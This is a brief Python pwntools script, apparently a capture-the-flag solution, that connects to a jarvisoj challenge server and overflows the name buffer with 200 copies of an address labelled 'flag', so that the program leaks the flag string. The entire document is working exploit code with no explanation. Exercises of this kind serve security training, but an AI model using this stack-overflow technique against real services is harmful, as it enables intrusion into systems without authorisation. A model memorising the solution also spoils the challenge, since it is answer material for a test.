#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
p = remote('pwn.jarvisoj.com', 9877)
test = 0x40094E
flag = 0x400d20
p.recvuntil('What\'s your name?')
p.sendline(p64(flag) * 200)
p.recvuntil('Please overwrite the flag:')
p.sendline()
p.recvall()
p.interactive()